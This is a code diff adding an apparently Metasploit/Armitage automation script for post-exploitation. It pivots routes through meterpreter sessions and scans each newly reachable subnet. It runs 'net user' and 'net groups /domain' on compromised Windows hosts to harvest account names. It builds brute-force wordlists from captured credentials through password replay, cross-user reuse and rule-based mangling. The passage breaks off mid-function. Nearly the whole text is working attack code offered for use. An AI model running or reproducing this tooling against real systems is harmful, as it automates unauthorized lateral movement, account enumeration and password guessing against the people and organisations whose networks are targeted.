+	if( -ismeterpreter $1 ){
+		println("Creating pivots for all networks on session $1");
+		m_cmd($1, "route", &autopivot_route);
+	}
+	else {
+		println("Session ID incorrect or its a shell session, try upgrading to a meterpreter session first");
+	}
+}
+
+sub autopivot_route {
+	local('$1 $2 $3 $session $cmd $output @parsed $x $subnet $netmask %routelist $network');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	@parsed = parse_route($output);
+	
+	for( $x = 0; $x < size(@parsed); $x++){
+		$subnet = @parsed[$x]['Subnet'];
+		$netmask = @parsed[$x]['Netmask'];
+		
+		if( $subnet ne "0.0.0.0" && $netmask ne "255.255.255.255" ) {
+			#println("DEBUG " . @parsed[$x] );
+			%routelist[$subnet] = $netmask;
+		}
+	}
+	
+	foreach $network (keys(%routelist)) {
+		#println("DEBUG Got the network: " . $network );
+		
+		# only add the route if its not in the local connected network
+		# and if we dont have a route to that network
+		if( !is_in_my_network($network) && !have_route($network, %routelist[$network]) ){
+		
+			##### This is a cheap hack
+			### the java meterpreter payload always reports /8
+			## for the netmask instead of the real /24, so lets hardcode this shit..
+			if( "java/java" isin session_data($session)['platform'] ){
+				if($debug != 0){
+					println("DEBUG adding route from java payload for $network with subnet 255.255.255.0" );
+				}
+				route_add($network, "255.255.255.0" , $session);
+			}
+			else {
+				if($debug != 0){
+					println("DEBUG adding route for $network with subnet " . %routelist[$network] );
+				}
+				route_add($network, %routelist[$network], $session);
+			}
+		}
+	}
+	clear(%routelist);
+}
+
+on route_add {
+	if($debug != 0){
+		println("\c3 ===== DEBUG on route " . $1);
+	}
+	scan($1);
+}
+
+command scan {
+	scan($1);
+}
+
+sub scan {
+	local('$input $target %scan_options $ip $subnet @subnetmask $line $mask $x $y $ssh_tunnel_port');
+	# input is 10.1.1.0/255.255.255.0 via 28
+	# or 10.1.1.0/255.255.255.0
+	
+	$input = split(' ', $1)[0];
+	
+	# first get the CIDR to pass to the portscan module
+	$ip = substr($input, 0, indexOf($1, "/") );
+	$subnet = substr($input, indexOf($input, "/") + 1);
+	# this wont work for ipv6
+	@subnetmask = split('\.', $subnet);
+	@subnetmask[0] = formatNumber( parseNumber(@subnetmask[0]) , 2);
+	@subnetmask[1] = formatNumber( parseNumber(@subnetmask[1]) , 2);
+	@subnetmask[2] = formatNumber( parseNumber(@subnetmask[2]) , 2);
+	@subnetmask[3] = formatNumber( parseNumber(@subnetmask[3]) , 2);
+	$mask = 0;
+	for( $x = 0; $x < 4; $x++){
+		$line = @subnetmask[$x];
+		for( $y = 0; $y < strlen($line); $y++){
+			if( charAt($line, $y) eq "1" ){
+				$mask++;
+			}
+		}
+	}
+	$target = $ip . "/" . $mask;
+	
+	if( is_over_ssh_tunnel($ip) ){
+		$ssh_tunnel_port = get_ssh_tunnel_for_ip($ip);
+		wait_for_tunnel($ssh_tunnel_port);
+		%scan_options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+	}
+	
+	%scan_options['RHOSTS'] = $target;
+	%scan_options['CONCURRENCY'] = $portscan_concurrency;
+	%scan_options['PORTS'] = $portscan_ports;
+	%scan_options['TIMEOUT'] = $portscan_timeout;
+	%scan_options['ConnectTimeout'] = $portscan_connect_timeout;
+	%scan_options['THREADS'] = $threads;
+	%scan_options['ShowProgress'] = 'false';
+	
+	launch("auxiliary", $portscan_type, %scan_options);
+}
+
+command have_route {
+	if( have_route($1,$2) ){
+		println("\c6DEBUG we have a route to $1");
+	}
+	else {
+		println("\c5DEBUG we dont a route to $1");
+	}
+}
+
+sub have_route {
+	local('$ip $subnet $return $x @routes %routelist');
+	$ip = $1;
+	$subnet = $2;
+	$return = false;
+	
+	@routes = routes();
+	for( $x = 0; $x < size(@routes); $x++){
+		if( is_in_network($ip, route_info(@routes[$x])['host'], route_info(@routes[$x])['mask']) ){
+			$return = true;
+		}
+	}
+	
+	# check the ssh tunnels
+	for( $x = 0; $x < size(@ssh_tunnels); $x++){
+		%routelist = @ssh_tunnels[$x];
+		if( is_in_network($ip, %routelist['network'], %routelist['mask']) ){
+			$return = true;
+		}
+	}
+	
+	return $return;
+}
+
+# check if IP is in the IP/subnet range
+# first argument is an IP address
+# second argument is an IP address
+# third is the subnet mask for the second IP address
+sub is_in_network {
+	local('$checkip @checkip $inip @inip $insubnet @insubnet $x ');
+	$checkip = $1;
+	@checkip = split('\.', $checkip);
+	
+	$inip = $2;
+	@inip = split('\.', $inip);
+	
+	$insubnet = $3;
+	@insubnet = split('\.', $insubnet);
+	
+	@checkip[0] = formatNumber( parseNumber(@checkip[0]) , 2);
+	@checkip[1] = formatNumber( parseNumber(@checkip[1]) , 2);
+	@checkip[2] = formatNumber( parseNumber(@checkip[2]) , 2);
+	@checkip[3] = formatNumber( parseNumber(@checkip[3]) , 2);
+	
+	@inip[0] = formatNumber( parseNumber(@inip[0]) , 2);
+	@inip[1] = formatNumber( parseNumber(@inip[1]) , 2);
+	@inip[2] = formatNumber( parseNumber(@inip[2]) , 2);
+	@inip[3] = formatNumber( parseNumber(@inip[3]) , 2);
+	
+	@insubnet[0] = formatNumber( parseNumber(@insubnet[0]) , 2);
+	@insubnet[1] = formatNumber( parseNumber(@insubnet[1]) , 2);
+	@insubnet[2] = formatNumber( parseNumber(@insubnet[2]) , 2);
+	@insubnet[3] = formatNumber( parseNumber(@insubnet[3]) , 2);
+	
+	for( $x = 0; $x < 4; $x++ ) {
+		if( (@inip[$x] & @insubnet[$x]) != (@checkip[$x] & @insubnet[$x]) ){
+			return false;
+		}
+	}
+	return true;
+}
+
+on console_ifconfig {
+	local('$2 $3 $cmd $output $line @data $x');
+	$cmd = $2;
+	$output = $3;
+	@data = split('\n', $output);
+	for( $x = 0; $x < size(@data) - 1; $x = $x + 2){
+		$line = "" . @data[$x] . @data[$x + 1];
+		# if the output line contains "inet addr"
+		if( "inet addr" isin $line ){
+			if( lhost() isin $line ){			
+				# get our ip for eth0
+				$myip = substr($line, indexOf($line, "inet addr:") + 10, indexOf($line, " ", indexOf($line, "inet addr:") + 10 ));
+				# get the subnet mask for our ip address
+				$mysubnet = substr($line, indexOf($line, "Mask:") + 5);
+			}
+		}
+	}
+}
+
+command get_my_ip {
+	get_my_ip();
+	println("my ip  \[" . $myip . "\]");
+	println("subnet \[" . $mysubnet . "\]");
+}
+
+sub get_my_ip {
+	local('$console');
+	#
+	# probably need to change this and do it differently so it works on
+	# systems that dont have ifconfig (windows) etc
+	#
+	# easier to use netstat -rn to get a list of our networks
+	#
+	$console = console();
+	cmd($console, "ifconfig");
+	cmd_stop($console);
+}
+
+sub is_in_my_network {
+	local('$ip @ip @blacklist_ip1');
+	$ip = $1;
+	
+	@ip = split('\.', $ip);
+	
+	# check if the IP is in our blacklist of network ranges to ignore
+	@blacklist_ip1 = @("127", "255", "224");
+	if( @ip[0] in @blacklist_ip1 ){
+		return true;
+	}
+	
+	return is_in_network($1, $myip, $mysubnet);
+}
+
+command is_in_my_network {
+	if( is_in_my_network($1) ){
+		println("true");
+	}
+	else {
+		println("false");
+	}
+}
+
+command dump_session_info {
+	println("DEBUG: session info = " . session_data($1) );
+	println("DEBUG: session tunnel_local = " . session_data($1)['tunnel_local'] );
+}
+
+###############################################################################
+# Get a list of users on windows hosts
+###############################################################################
+command get_smb_users {
+	println("Getting SMB users");
+	get_smb_users($1);
+}
+
+sub get_smb_users {
+# $1 is the meterpreter sessionid
+
+ 	# net groups is only for a domain controller
+	m_exec($1, "net groups");
+	
+	# net user will get all the local user accounts
+	m_exec($1, "net user");
+	
+}
+
+on exec_net {
+	local('$session $cmd $output @outputlines $line $x @blacklist @niceline $dirtyline @validusers');
+	$session = $1;
+	$cmd = $2;
+	$output = $3;
+	
+	#println("DEBUG: smb users: " . $output );
+	
+	# there is some error that isnt caught properly here
+	# [17:28:26] variable '$3' not declared at internal.sl:817
+	# [17:28:27] &substr: illegal substring('', 0 -> 0, -1 -> -1) indices at passthepass.cna:636
+	# [17:28:27] attempted an invalid index: Index: 0, Size: 0 at passthepass.cna:712
+	
+	# split the output into lines and iterate over each line
+	@outputlines = split('\n', $output);
+	
+	if( size(@outputlines) > 0 ) {
+		foreach $line (@outputlines) {
+			if( size($line) > 0 ){
+				# remove the newline character from the end of each line
+				$line = substr($line, 0, size($line) - 1 );
+			}
+		}
+	
+		# Only continue if we dont have the following error message
+		if( "This command can be used only on a Windows Domain Controller." !in @outputlines ){
+			
+			# if the command was to get the list of groups, then lets parse the groups
+			# to get the list of users in each group
+			if( $cmd eq "net groups" ){
+				# This is the list of output from "net groups" to ignore
+				add(@blacklist, "Domain Controllers");
+				add(@blacklist, "Enterprise Read-only Domain Controllers");
+				add(@blacklist, "Domain Computers");
+				add(@blacklist, "DnsUpdateProxy");
+				add(@blacklist, "Read-only Domain Controllers");
+			
+				# remove the first three lines
+				removeAt(@outputlines, 0);
+				removeAt(@outputlines, 0);
+				removeAt(@outputlines, 0);
+				
+				if( size(@outputlines) > 0 ){
+					# remove the last line
+					removeAt(@outputlines, size(@outputlines) - 1 );
+				}
+				
+				foreach $line (@outputlines) {
+					# remove the * from the begining
+					$line = substr($line, 1);
+					# if the group ($line) is not in the blacklist, then lets get the users of that group
+					if( $line !in @blacklist ){
+						m_exec($session, "net groups \"" . $line . "\" /domain" );
+					}
+				}
+			}
+			
+			# if the command was to get the users of a group then lets parse the output
+			# and add all the users to our username file
+			if( "net groups " isin $cmd && " /domain" isin $cmd ){
+				# if the size is greater than 7 then there is output
+				if( size(@outputlines) > 7 ){
+					
+					# remove the first six lines
+					removeAt(@outputlines, 0);
+					removeAt(@outputlines, 0);
+					removeAt(@outputlines, 0);
+					removeAt(@outputlines, 0);
+					removeAt(@outputlines, 0);
+					removeAt(@outputlines, 0);
+					# remove the last line
+					removeAt(@outputlines, size(@outputlines) - 1 );
+					
+					foreach $line (@outputlines) {
+						# remove the newline character from the end
+						$line = substr($line, 0, size($line) - 1 );
+						
+						# first we replace three spaces or tabs with the pipe '|' character
+						# then we split the string by the pipe '|' character
+						@niceline = split('\|', replace($line, '   |\t', "|") );
+						
+						# then we iterate over the array to remove leading and trailing whitespace
+						for( $x = 0; $x < size(@niceline); $x++ ){
+							# remove leading spaces
+							@niceline[$x] = replace(@niceline[$x], '^[ ]+', "");
+							# remove the entire line if it only consists of spaces
+							@niceline[$x] = replace(@niceline[$x], '^[ ]+$', "");
+						}
+						
+						# remove any blanks
+						removeAll(@niceline, @(''));
+						
+						# now add the user to our list of valid usernames
+						addAll(@validusers, @niceline);
+					}				
+				}
+			}
+			
+			if( $cmd eq "net user" ){
+				# remove the first six lines
+				removeAt(@outputlines, 0);
+				removeAt(@outputlines, 0);
+				removeAt(@outputlines, 0);
+				# remove the last line
+				removeAt(@outputlines, size(@outputlines) - 1 );
+				
+				foreach $line (@outputlines) {
+					# remove the newline character from the end
+					$line = substr($line, 0, size($line) - 1 );
+					
+					# first we replace three spaces or tabs with the pipe '|' character
+					# then we split the string by the pipe '|' character
+					@niceline = split('\|', replace($line, '   |\t', "|") );
+					
+					# then we iterate over the array to remove leading and trailing whitespace
+					for( $x = 0; $x < size(@niceline); $x++ ){
+						# remove leading spaces
+						@niceline[$x] = replace(@niceline[$x], '^[ ]+', "");
+						# remove the entire line if it only consists of spaces
+						@niceline[$x] = replace(@niceline[$x], '^[ ]+$', "");	
+					}
+					
+					# remove any blanks
+					removeAll(@niceline, @(''));
+					
+					# now add the user to our list of valid usernames
+					addAll(@validusers, @niceline);
+				}
+			}
+		}
+	}
+	
+	#if we have some valid users to add
+	if( size(@validusers) > 0 ){
+		update_username_file(@validusers);
+	}
+}
+
+###############################################################################
+# Get the used to get the current shell session
+###############################################################################
+sub get_pass_from_session_id {
+	return get_pass_from_session( session_data($1) );
+}
+
+sub get_pass_from_session {
+# $1 is the complete session info
+	local('$longsessioninfo $sessioninfo $passfromcreds $creds $row $sessionuser $user $pass $host');
+	$longsessioninfo = $1;
+	$sessioninfo = $longsessioninfo['info'];
+	$passfromcreds = "login_autopwn.something.went.wrong";
+	$sessionuser = "";
+
+	if( "RLOGIN " isin $sessioninfo ) {
+		# rlogin doesnt use a password so we wont have it
+		# the last if statement will check if we dont have the password and get it from creds db
+		# so we still have a chance
+		# RLOGIN user from root (192.168.1.87:513)
+		$sessionuser = substr($sessioninfo, indexOf($sessioninfo, " ") + 1, indexOf($sessioninfo, " from ") );
+	}
+	
+	if( "TELNET " isin $sessioninfo || "SSH " isin $sessioninfo ) {
+		$passfromcreds = substr($sessioninfo, indexOf($sessioninfo, ":") + 1, indexOf($sessioninfo, " (" . $longsessioninfo['session_host'] . ":", indexOf($sessioninfo, ":")));
+	}
+
+	if( $sessionuser ne "" && $passfromcreds eq "login_autopwn.something.went.wrong" ) {
+		#get pass from creds db
+		$creds = call("db.creds")['creds'];
+		foreach $row ($creds) {
+			($host, $user, $pass, $type) = values($row, @("host", "user", "pass", "ptype"));
+			if ( ($user eq $sessionuser) && ($host eq $longsessioninfo['session_host']) && ($type eq "password") ) {
+				$passfromcreds = $pass;
+			}
+		}
+	}
+	
+	#println("DEBUG: $sessioninfo -- passfromcreds is $passfromcreds");
+
+	return $passfromcreds;
+}
+
+###############################################################################
+# Updating username and password files/wordlists
+###############################################################################
+sub update_username_file {
+	local('@input @importusers $filehandle $error $line @filecontents $creds $row $user $x $1');
+	@input = $1;
+	
+	# lowercase all the importusers
+	foreach $line (@input) {
+		add(@importusers, lc($line) );
+	}
+	clear(@input);
+	
+	#println("\c4DEBUG Got the following new users = " . @importusers);
+	
+	
+	if (!-exists script_resource($usernamefile) && !-isFile script_resource($usernamefile) && !-canread script_resource($usernamefile) && !-canwrite script_resource($usernamefile) ) { 
+		createNewFile(script_resource($usernamefile));
+		if (checkError($error)) { 
+			println("\c5[-] Could not create \$usernamefile  [" . script_resource($usernamefile) . "]: $error");
+		}
+	}
+	# open the username file
+	$filehandle = openf( script_resource($usernamefile) );
+	# now read line by line the list of users and add them to @filecontents, if they dont exist in @filecontents
+	while $line ( readln($filehandle) ) {
+		if( $line !in @filecontents ) {
+			add(@filecontents, $line);
+		}
+	}
+	closef($filehandle);
+	
+	# now add all the usernames from creds db
+	$creds = call("db.creds")['creds'];
+	foreach $row ($creds) {
+		($user) = values($row, @("user"));
+		# remove the domain from the username
+		if( "\\" isin $user ){
+			$user = substr($user, indexOf($user, "\\") + 1 );
+		}
+		# only add users that are not blank and not already added
+		if ($user ne "" && lc($user) !in @filecontents && lc($user) !in @blacklist_users) {
+			add(@filecontents, lc($user) );
+		}
+	}
+	
+	# add all the importuser to the filecontents array, this will only add unique values
+	addAll(@filecontents, @importusers);
+	
+	#remove all the blanks
+	removeAll(@filecontents, @(''));
+	
+	# remove all the blacklist users
+	removeAll(@filecontents, @blacklist_users);
+	
+	#println("\c4DEBUG filecontents = " . @filecontents);
+	
+	# open the username file
+	$filehandle = openf(">" . script_resource($usernamefile));
+	if (checkError($error)) {
+		println("\c4Could not write/open \$usernamefile: $error");
+	}
+	
+	# now output the new users to the file
+	for ($x = 0; $x < size(@filecontents); $x++) {
+		println($filehandle, @filecontents[$x] );
+	}
+	
+	if($debug != 0){
+		println("\cBDEBUG new discovered users = " . @importusers );
+		println("\c3DEBUG all discovered users = " . @filecontents );
+	}
+	
+	closef($filehandle);
+	clear(@filecontents);
+	clear(@importusers);
+}
+
+command list_usernames {
+	list_usernames();
+}
+
+sub list_usernames {
+	local('$filehandle $error $line');
+	if (!-exists script_resource($usernamefile) && !-isFile script_resource($usernamefile) && !-canread script_resource($usernamefile) && !-canwrite script_resource($usernamefile) ) { 
+		createNewFile(script_resource($usernamefile));
+		if (checkError($error)) { 
+			println("\c5[-] Could not create \$usernamefile  [" . script_resource($usernamefile) . "]: $error");
+		}
+	}
+	$filehandle = openf( script_resource($usernamefile) );
+	# catch the error if we cant open the file
+	if (checkError($error)) {
+		println("\c4Could not read/open \$usernamefile: $error");
+	}
+	# now read line by line the list of users and add them to @filecontents, if they dont exist in @filecontents
+	while $line ( readln($filehandle) ) {
+		println($line);
+	}
+	closef($filehandle);
+}
+
+###############################################################################
+# This is the new wordist creation that outputs user space pass into a list for that host:port
+###############################################################################
+#command is_smb_hash {
+#	if( is_smb_hash($1) ){
+#		println("true");
+#	}
+#	else {
+#		println("false");
+#	}
+#}
+#sub is_smb_hash {
+#	local('$pass');
+#	$pass = $1;
+#	
+#	if( strlen($pass) == 65 && ":" isin $pass){
+#		return true;
+#	}
+#}
+command set_rule_complexity {
+	$rule_complexity = $1;
+}
+
+
+command update_wordlist {
+	update_wordlist($1, $2);
+	println("Finished updating creds file");
+}
+
+sub update_wordlist {
+	local('@userpassarray @failedarray $targethost $targetservice $failed_host_service_file $wordlist_host_service_file $wordlist_handle $filehandle $failed_handle $wordlist_handle_user $wordlist_handle_pass $creds $row $userpass $host $port $user $pass $credstype $active $read $error $x $y @userarray @passarray $line @owned_user_accounts');
+	$targethost = $1;
+	$targetservice = $2;
+	$failed_host_service_file = "wordlists/failed" . "_" . $targethost . "_" . $targetservice;
+	$wordlist_host_service_file = "wordlists/wordlist" . "_" . $targethost . "_" . $targetservice;
+	
+	#println("DEBUG failed_host_service_file   = " . $failed_host_service_file );
+	#println("DEBUG wordlist_host_service_file = " . $wordlist_host_service_file );
+	
+	# get the creds table
+	$creds = call("db.creds")['creds'];
+	
+	# fill @owned_user_accounts with all the user accounts that we've owned for that $targethost
+	# this will ensure that we dont try to get root (on ssh) when we already have the root password (on ssh)
+	foreach $row ($creds) {
+		($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+		if( $active eq "1" && $host eq $targethost && $port eq $targetservice){		
+			if( $user !in @owned_user_accounts ){
+				add(@owned_user_accounts, $user);
+			}
+		}
+	}
+	
+	# first add all the known working creds to the top of the list, we want to try them first
+	foreach $row ($creds) {
+		($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+		if( $active eq "1" && $host eq $targethost && $port eq $targetservice){
+			$userpass = $user . " " . $pass;
+			add(@userpassarray, $userpass);
+		}
+	}
+	
+	# just get all the creds from creds db
+	if( $pass_replay eq "1" ){
+		foreach $row ($creds) {
+			($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+			if( $active eq "1" ){
+				# remove the domain from the username
+				if( "\\" isin $user ){
+					$user = substr($user, indexOf($user, "\\") + 1 );
+				}
+				# dont use a smb_hash on anything other than the port 445
+				if( $credstype eq "smb_hash" && $targetservice ne "445" ){
+					#println("\c2DEBUG skipping this cred as its a smb_hash");
+				}
+				else{
+					if( $user !in @owned_user_accounts ){
+						$userpass = lc($user) . " " . $pass;
+					}
+				}
+				if( $userpass !in @userpassarray ) {
+					add(@userpassarray, $userpass);
+				}
+				
+				#println("\c3DEBUG userpass = " . $userpass );
+			}
+		}
+	}
+	
+	#println("\c8DEBUG credentials to try with pass_replay enabled = " . size(@userpassarray) );
+	
+	# try all the passwords from creds db across all the usernames from creds db
+	if( $pass_reuse eq "1" ){
+		foreach $row ($creds) {
+			($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+			if( $active eq "1" ){
+				# remove the domain from the username
+				if( "\\" isin $user ){
+					$user = substr( lc($user), indexOf($user, "\\") + 1 );
+				}
+				# add every password to passarray
+				if ( $pass !in @passarray ) {
+					# dont use a smb_hash on anything other than the port 445
+					if( $credstype eq "smb_hash" && $targetservice ne "445" ){
+						#println("\c2DEBUG skipping this cred as its a smb_hash");
+					}
+					else{
+						add(@passarray, $pass);
+					}
+				}
+				# add every username to userarray
+				if ( $user !in @userarray ) {
+					add(@userarray, lc($user) );
+				}
+			}
+		}
+		
+		if (!-exists script_resource($usernamefile) && !-isFile script_resource($usernamefile) && !-canread script_resource($usernamefile) && !-canwrite script_resource($usernamefile) ) { 
+			createNewFile(script_resource($usernamefile));
+			if (checkError($error)) { 
+				println("\c5[-] Could not create \$usernamefile  [" . script_resource($usernamefile) . "]: $error");
+			}
+		}
+		# now add all the usernames discovered
+		$filehandle = openf( script_resource($usernamefile) );
+		if (checkError($error)) {
+			println("\c4Could not read/open \$usernamefile: $error");
+		}
+		while $line ( readln($filehandle) ) {
+			if( $line !in @userarray ) {
+				add(@userarray, $line);
+			}
+		}
+		closef($filehandle);
+		
+		# first remove all the owned user accounts
+		removeAll(@userarray, @owned_user_accounts);
+		
+		# loop over user array and add user pass pair to array
+		for ($x = 0; $x < size(@userarray); $x++) {
+			for ($y = 0; $y < size(@passarray); $y++) {
+				$userpass = @userarray[$x] . " " . @passarray[$y];
+				if ( $userpass !in @userpassarray ) {
+					add(@userpassarray, $userpass);
+				}
+			}
+		}
+		clear(@userarray);
+		clear(@passarray);
+	}
+	
+	#println("\c8DEBUG credentials to try with pass_reuse enabled = " . size(@userpassarray) );
+	
+	# read in the wordlists and add unique pairs to the userpassarray
+	if( $pass_wordlist eq "1" ){
+		# add every username from $pass_wordlist_userfile into userarray
+		$wordlist_handle_user = openf($pass_wordlist_userfile);
+		while $user (readln($wordlist_handle_user)) {
+			if( $user ne "" && $user !in @owned_user_accounts ){
+				$wordlist_handle_pass = openf($pass_wordlist_passfile);
+				while $pass (readln($wordlist_handle_pass)) {
+					if( $pass ne "" ){
+						add(@userpassarray, lc($user) . " " . $pass);
+					}
+				}
+				closef($wordlist_handle_pass);
+			}
+			#println("\c8DEBUG pass_wordlist size = " . size(@userpassarray) );
+		}
+		closef($wordlist_handle_user);
+	}
+	
+	#println("\c8DEBUG credentials to try with pass_wordlist enabled = " . size(@userpassarray) );
+	
+	# keep the user pass pair relationship and just mangle the password for that user
+	if( $pass_mangle eq "1" ){
+		# get creds
+		foreach $row ($creds) {
+			($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+			# dont use a smb_hash
+			if( $credstype eq "password" && $active eq "1" && $user !in @owned_user_accounts ){
+				# remove the domain from the username
+				if( "\\" isin $user ){
+					$user = substr( lc($user), indexOf($user, "\\") + 1 );
+				}
+				# take each password and mangle it
+				@passarray = mangle_creds( lc($user), $pass);
+				# add every password to the user and update the array
+				for ($y = 0; $y < size(@passarray); $y++) {
+					$userpass = lc($user) . " " . @passarray[$y];
+					if ( $userpass !in @userpassarray ) {
+						add(@userpassarray, $userpass);
+					}
+				}
+				clear(@passarray);
+			}
+		}
+	}
+	
+	#println("\c8DEBUG credentials to try with pass_mangle enabled = " . size(@userpassarray) );
+	
+	# Take all the passwords, mangle them, and add every username
+	if( $pass_mangle_across_users eq "1" ){
+		# get creds
+		foreach $row ($creds) {
+			($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+			# dont use a smb_hash
+			if( $credstype eq "password" && $active eq "1" ){
+				# remove the domain from the username
+				if( "\\" isin $user ){
+					$user = substr( lc($user), indexOf($user, "\\") + 1 );
+				}
+				# take each password and mangle it
+				addAll(@passarray, mangle_creds( lc($user), $pass) );
+			}
+		}
+		
+		# go through creds and add all the usernames to @userarray
+		foreach $row ($creds) {
+			($host, $port, $user, $pass, $credstype, $active) = values($row, @("host", "port", "user", "pass", "ptype", "active"));
+			# remove the domain from the username
+			if( "\\" isin $user ){
+				$user = substr( lc($user), indexOf($user, "\\") + 1 );
+			}
+			if( $user !in @userarray ) {
+				add(@userarray, lc($user) );
+			}
+		}
+		
+		# add all the discovered_usernames
+		$filehandle = openf( script_resource($usernamefile) );
+		if (checkError($error)) {
+			println("\c4Could not read/open \$usernamefile: $error");
+		}
+		while $line ( readln($filehandle) ) {
+			if( $line !in @userarray ) {
+				add(@userarray, $line);
+			}
+		}
+		closef($filehandle);
+		
+		# remove all the user account that we already have creds for
+		removeAll(@userarray, @owned_user_accounts);
+		
+		# now take all the passwords and add them to every username
+		for ($x = 0; $x < size(@userarray); $x++) {
+			for ($y = 0; $y < size(@passarray); $y++) {
+				$userpass = @userarray[$x] . " " . @passarray[$y];
+				if ( $userpass !in @userpassarray ) {
+					add(@userpassarray, $userpass);
+				}
+			}
+		}
+		
+		clear(@userarray);
+		clear(@passarray);
+	}
+	
+	#println("\c8DEBUG credentials to try with pass_mangle_across_users enabled = " . size(@userpassarray) );
+	
+	# mangle the password wordlist
+	if( $pass_wordlist_mangle eq "1" ){
+		
+		# add every username from $pass_wordlist_userfile into userarray
+		$wordlist_handle_user = openf($pass_wordlist_userfile);
+		while $user (readln($wordlist_handle_user)) {
+			if( $user ne "" && $user !in @owned_user_accounts ){
+				$wordlist_handle_pass = openf($pass_wordlist_passfile);
+				while $pass (readln($wordlist_handle_pass)) {
+					if( $pass ne "" ){
+						
+						# take each password and mangle it
+						@passarray = mangle_creds( lc($user), $pass);
+						# add every password to the user and update the array
+						for ($y = 0; $y < size(@passarray); $y++) {
+							$userpass = lc($user) . " " . @passarray[$y];
+							if ( $userpass !in @userpassarray ) {
+								add(@userpassarray, $userpass);
+							}
+						}
+						clear(@passarray);
+						
+					}
+				}
+				closef($wordlist_handle_pass);
+			}
+			#println("\c8DEBUG pass_wordlist size = " . size(@userpassarray) );
+		}
+		closef($wordlist_handle_user);
+	}
+	#println("\c8DEBUG credentials to try with pass_wordlist_mangle enabled = " . size(@userpassarray) );
+	
+	# now read in all user pass pairs from failed list and remove them from wordlist
+	# open the failed list and add everything to @failedarray
+	if (!-exists script_resource($failed_host_service_file) && !-isFile script_resource($failed_host_service_file) && !-canread script_resource($failed_host_service_file) && !-canwrite script_resource($failed_host_service_file) ) { 
+		createNewFile(script_resource($failed_host_service_file));
+		if (checkError($error)) { 
+			println("\c5[-] Could not create \$usernamefile  [" . script_resource($failed_host_service_file) . "]: $error");
+		}
+	}
+	$failed_handle = openf(script_resource($failed_host_service_file));
+	if (checkError($error)) {
+		println("\c4Could not open file: $error");
+	}
+	while $read (readln($failed_handle)) {
+		add(@failedarray, $read);
+	}
+	closef($failed_handle);
+	
+	# remove any blank lines
+	removeAll(@userpassarray, @(''));
+	removeAll(@failedarray, @(''));
+	
+	#println("DEBUG userpassarray = " . @userpassarray);
+	#println("\c9DEBUG userpassarray size = " . size(@userpassarray) );
+	#println("DEBUG failedarray   = " . @failedarray);
+	#println("\c5DEBUG failedarray size   = " . size(@failedarray) );
+	
+	local('@debug');
+	@debug = removeAll(@userpassarray, @failedarray);
+	#println("\c2DEBUG new creds to try = " . @debug );
+	
+	
+	# remove everything from @failedarray that is in @userpassarray
+	removeAll(@userpassarray, @failedarray)
+	clear(@failedarray);
+	
+	if($debug != 0){
+		#println("DEBUG credentials to try = " . @userpassarray);
+		println("\c8DEBUG credentials to try = " . size(@userpassarray) );
+		println("DEBUG rule_complexity is $rule_complexity ");
+	}
+	
+	if( size(@userpassarray) eq 0 ){
+		if( $rule_complexity < $rule_complexity_max ){
+			$rule_complexity++;
+			if($debug != 0){
+				println("DEBUG increasing rule_complexity to $rule_complexity ");
+			}
+		}
+		else {
+			println("\c9Feed me more wordlists! Nothing to do for " . $targethost . " port $targetservice");
+			say("\c5login_autopwn:\c9 Feed me more wordlists! Nothing to do for " . $targethost . " port $targetservice");
+		}
+	}
+	
+	
+	# output @userpassarray to the wordlist
+	if (!-exists script_resource($wordlist_host_service_file) && !-isFile script_resource($wordlist_host_service_file) && !-canread script_resource($wordlist_host_service_file) && !-canwrite script_resource($wordlist_host_service_file) ) { 
+		createNewFile(script_resource($wordlist_host_service_file));
+		if (checkError($error)) { 
+			println("\c5[-] Could not create \$usernamefile  [" . script_resource($wordlist_host_service_file) . "]: $error");
+		}
+	}
+	$wordlist_handle = openf(">" . script_resource($wordlist_host_service_file));
+	if (checkError($error)) {
+		println("\c4Could not open file: $error");
+	}
+	
+	# output the array in reverse as add() will insert the item at the begining
+	# so the first item we added (the known working credentials) are now at the end of the array
+	for ($x = size(@userpassarray) - 1; $x >= 0 ; $x--) {
+		println( $wordlist_handle, @userpassarray[$x] );
+	}
+	
+	closef($wordlist_handle);
+	clear(@userpassarray);
+	clear(@failedarray);
+	clear(@userarray);
+	clear(@passarray);
+	
+}
+
+command clear_bruteforce_files {
+	clear_bruteforce_files();
+}
+sub clear_bruteforce_files {
+	local('@file_list $file');
+	@file_list = ls(script_resource("wordlists"));
+	foreach $file (@file_list) {
+		if( "wordlist_" isin $file || "failed_" isin $file ){
+			deleteFile($file);
+		}
+	}
+	deleteFile(script_resource($usernamefile));
+}
+###############################################################################
+# Return a list of passwords that have some simple rules applied to them
+###############################################################################
+command mangle_creds {
+	println("mangle creds: " . mangle_creds($1, $2) );
+}
+
+sub mangle_creds {
+# first arg is the username
+# second arg is the password
+	local('$inputuser $inputpass @creds $creds $credsuser $credspass $credstype $row @mangled $pass $newpass $x $size $oldsize $rules');
+	$inputuser = $1;
+	$inputpass = $2;
+
+	# println("Mangling the creds [" . $inputuser . "][" . $inputpass . "]");
+	
+	# add all passwords for the user $user to @creds
+	$creds = call("db.creds")['creds'];
+	foreach $row ($creds) {
+		($credsuser, $credspass, $credstype) = values($row, @("user", "pass", "ptype"));
+		if( $credstype eq "password" && $credsuser eq $inputuser && $credspass ne '' ) {
+			add(@creds, $credspass);
+		}
+	}
+		
+	# check that pass is not blank then add to @mangled
+	if( $inputpass ne '') {
+		add(@mangled, $inputpass);
+	}
+
+	$pass = $inputpass;
+
+	# These rules should only be applied once
+	# Increment and decrement the last digit
+	if( $pass ismatch '.*\d$' ) {
+		$newpass = left($pass, strlen($pass)-1 ) . (right($pass, 1) + 1);
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+		$newpass = left($pass, strlen($pass)-1 ) . (right($pass, 1) - 1);
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+	}
+
+	# Increment and decrement the second last digit
